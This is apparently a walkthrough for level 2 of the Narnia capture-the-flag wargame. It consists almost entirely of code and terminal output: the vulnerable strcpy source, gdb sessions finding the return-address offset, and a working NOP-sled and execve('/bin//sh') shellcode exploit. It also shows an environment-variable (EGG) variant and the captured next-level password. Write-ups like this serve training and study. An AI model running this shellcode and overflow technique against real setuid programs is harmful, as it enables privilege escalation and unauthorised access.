
```
narnia2@narnia:~$ cat /narnia/narnia2.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
	char buf[128];

	if(argc == 1){
		printf("Usage: %s argument\n", argv[0]);
		exit(1);
	}
	strcpy(buf,argv[1]);
	printf("%s", buf);

	return 0;
}
```

```
(gdb) r $(python -c'print "\x41"*140 + "\x42"*4')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia2 $(python -c'print "\x41"*140 + "\x42"*4')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/300x $esp
0xffffd690:	0x00000000	0xffffd724	0xffffd730	0xf7feae3a
0xffffd6a0:	0x00000002	0xffffd724	0xffffd6c4	0x08049768
0xffffd6b0:	0x0804821c	0xf7fcc000	0x00000000	0x00000000
0xffffd6c0:	0x00000000	0x8a6dcce9	0xb2b5c8f9	0x00000000
0xffffd6d0:	0x00000000	0x00000000	0x00000002	0x08048360
0xffffd6e0:	0x00000000	0xf7ff0630	0xf7e3b9e9	0xf7ffd000
0xffffd6f0:	0x00000002	0x08048360	0x00000000	0x08048381
0xffffd700:	0x0804845d	0x00000002	0xffffd724	0x080484d0
0xffffd710:	0x08048540	0xf7feb2d0	0xffffd71c	0x0000001c
0xffffd720:	0x00000002	0xffffd84a	0xffffd85a	0x00000000
0xffffd730:	0xffffd8eb	0xffffd8fb	0xffffd90f	0xffffd92e
0xffffd740:	0xffffd941	0xffffd94a	0xffffd968	0xffffd975
0xffffd750:	0xffffde96	0xffffdea1	0xffffdead	0xffffdf0b
0xffffd760:	0xffffdf22	0xffffdf31	0xffffdf43	0xffffdf4c
0xffffd770:	0xffffdf5f	0xffffdf67	0xffffdf77	0xffffdfa6
0xffffd780:	0xffffdfc6	0x00000000	0x00000020	0xf7fdbbe0
0xffffd790:	0x00000021	0xf7fdb000	0x00000010	0x178bfbff
0xffffd7a0:	0x00000006	0x00001000	0x00000011	0x00000064
0xffffd7b0:	0x00000003	0x08048034	0x00000004	0x00000020
0xffffd7c0:	0x00000005	0x00000008	0x00000007	0xf7fdc000
0xffffd7d0:	0x00000008	0x00000000	0x00000009	0x08048360
0xffffd7e0:	0x0000000b	0x000036b2	0x0000000c	0x000036b2
0xffffd7f0:	0x0000000d	0x000036b2	0x0000000e	0x000036b2
0xffffd800:	0x00000017	0x00000000	0x00000019	0xffffd82b
0xffffd810:	0x0000001f	0xffffdfe8	0x0000000f	0xffffd83b
0xffffd820:	0x00000000	0x00000000	0xd8000000	0x7639f412
0xffffd830:	0xe18b3ae0	0x1c44c934	0x69ec8985	0x00363836
0xffffd840:	0x00000000	0x00000000	0x6e2f0000	0x696e7261
0xffffd850:	0x616e2f61	0x61696e72	0x41410032	0x41414141
0xffffd860:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd890:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd8a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd8b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd8c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd8d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd8e0:	0x41414141	0x42424141	0x53004242	0x4c4c4548
0xffffd8f0:	0x69622f3d	0x61622f6e	0x54006873	0x3d4d5245
0xffffd900:	0x72657478	0x35322d6d	0x6c6f6336	0x5300726f
0xffffd910:	0x435f4853	0x4e45494c	0x37313d54	0x38312e32
0xffffd920:	0x312e302e	0x31393520	0x32203433	0x53530032
```

```
(gdb) r $(python -c'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*15 + "\x90\xd8\xff\xff"')
```

```
(gdb) r $(python -c'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*15 + "\x90\xd8\xff\xff"')
Starting program: /narnia/narnia2 $(python -c'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*15 + "\x90\xd8\xff\xff"')
process 1280 is executing new program: /bin/dash
$ id
uid=14002(narnia2) gid=14002(narnia2) groups=14002(narnia2)
```

```
narnia2@narnia:~$ /narnia/narnia2 $(python -c'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*15 + "\x90\xd8\xff\xff"')
$ cat /etc/narnia_pass/narnia3
vaequeezee
```

```
narnia2@narnia:~$ export EGG=$(python -c 'print "A"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
narnia2@narnia:~$ echo $EGG
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1�Ph//shh/bin��P��S��
  ̀
```
```
narnia2@narnia:~$ cat env.c
#include <stdio.h>
int main( int argc, char **argv ) {
    printf( "\n%p\n", getenv( "EGG" ) );
    return( 0 );
}
narnia2@narnia:~$ gcc -o env env.c -m32
narnia2@narnia:~$ ./env

0xffffd907
```
```
narnia2@narnia:~$ /narnia/narnia2 $(python -c 'print "A"*140 + "\x07\xd9\xff\xff"')
$ id
uid=14002(narnia2) gid=14002(narnia2) euid=14003(narnia3) groups=14003(narnia3),14002(narnia2)
$ cat /etc/narnia_pass/narnia3
vaequeezee
```
